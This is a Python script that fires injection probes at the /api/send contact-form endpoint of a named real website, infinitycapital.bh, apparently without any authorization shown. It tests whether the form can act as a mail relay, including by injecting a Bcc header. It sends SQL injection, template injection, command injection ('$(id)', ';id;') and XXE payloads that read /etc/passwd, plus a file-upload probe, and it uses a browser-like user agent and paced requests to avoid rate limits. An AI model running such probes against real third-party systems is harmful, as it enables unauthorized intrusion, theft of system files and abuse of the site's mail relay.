#!/usr/bin/env python3
"""W19h: real-shape /api/send tests — verify the relay finding & probe injection.

Contract (from shipped chunk 275):
  POST /api/send  multipart/form-data
  fields: fname,lname,areacode,tel,cname,subject,msg,check,targets
  success when JSON response has D.data != null
Rate limit: keep a >=3s gap or we get edge 429s.
"""
import json, re, sys, time, urllib.request, urllib.error, uuid

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE = "https://www.infinitycapital.bh"
LOG = open("/tmp/w19h.jsonl", "a")
TAG = "w19h-" + uuid.uuid4().hex[:8]


def boundary():
    return "----WebKitFormBoundary" + uuid.uuid4().hex[:16]


def post(fields, files=None, ct_multipart=True, raw=None, ctype=None, timeout=30):
    b = boundary()
    parts = []
    for k, v in fields.items():
        parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n")
    for k, (fn, content, ft) in (files or {}).items():
        parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fn}\"\r\n"
                     f"Content-Type: {ft}\r\n\r\n{content}\r\n")
    parts.append(f"--{b}--\r\n")
    body = raw if raw is not None else "".join(parts).encode()
    r = urllib.request.Request(BASE + "/api/send", data=body, method="POST",
                               headers={"User-Agent": UA, "Accept": "*/*"})
    r.add_header("Content-Type",
                 ctype if ctype else (f"multipart/form-data; boundary={b}" if ct_multipart
                                      else "application/x-www-form-urlencoded"))
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            rb = resp.read()
            return resp.status, dict(resp.headers), rb, time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(), time.time() - t0
    except Exception as e:
        return 0, {}, str(e).encode(), time.time() - t0


def show(lbl, res, maxb=400):
    st, h, b, dt = res
    print(f"  {lbl}\n    -> {st} {len(b)}B {dt:.2f}s body={b[:maxb]!r}")
    LOG.write(json.dumps({"tag": TAG, "label": lbl, "status": st, "len": len(b),
                          "body": b[:3000].decode("utf-8", "replace")}) + "\n")
    LOG.flush()


def base_fields(**over):
    f = {"fname": "Test", "lname": "Tester", "areacode": "+973", "tel": "30000000",
         "cname": "Test Person", "subject": "General Inquiry", "msg": "Hello there.",
         "check": "", "targets": "info@infinitycapital.bh"}
    f.update(over)
    return f


if __name__ == "__main__":
    print(f"=== /api/send real-shape testing, tag={TAG} ===")

    print("\n[1] baseline well-formed request (no send to real 3rd party; use example.com)")
    show("baseline targets=example.com", post(base_fields(targets="probe-%s@example.com" % TAG)))
    time.sleep(4)

    print("\n[2] missing required fields -> shape/validation oracle")
    for miss in ["fname", "msg", "targets", "subject", "check", "tel"]:
        f = base_fields(targets="probe@example.com")
        del f[miss]
        show(f"missing {miss}", post(f))
        time.sleep(4)

    print("\n[3] type confusion / non-string fields")
    for lbl, f in [
        ("targets int", base_fields(targets=12345)),
        ("targets array-ish", base_fields(targets='["a@b.com","c@d.com"]')),
        ("targets newline-inject", base_fields(targets="a@b.com\nBcc: victim@example.org")),
        ("msg huge", base_fields(targets="probe@example.com", msg="A" * 100000)),
    ]:
        show(lbl, post(f))
        time.sleep(4)

    print("\n[4] INJECTION probes on server-parsed string fields")
    inj = [
        ("fname sqli", "fname", "' OR '1'='1"),
        ("fname sqli2", "fname", "x' UNION SELECT NULL-- -"),
        ("subject sqli", "subject", "' AND SLEEP(5)-- -"),
        ("msg sqli", "msg", "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"),
        ("fname ssti", "fname", "{{7*7}}"),
        ("fname ssti2", "fname", "${7*7}"),
        ("msg ssti", "msg", "#{7*7}<%= 7*7 %>"),
        ("fname cmdi", "fname", ";id;"),
        ("fname cmdi2", "fname", "$(id)"),
        ("msg cmdi", "msg", "`id`"),
        ("fname xxe", "fname", "AAAA<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>&x;"),
    ]
    for lbl, field, payload in inj:
        show(lbl, post(base_fields(targets="probe@example.com", **{field: payload})))
        time.sleep(4)

    print("\n[5] file upload via the form (no field suggests upload, but test)")
    show("file field probe", post(base_fields(targets="probe@example.com"),
                                 files={"file": ("t.html", b"<html>probe</html>", "text/html")}))
    time.sleep(4)
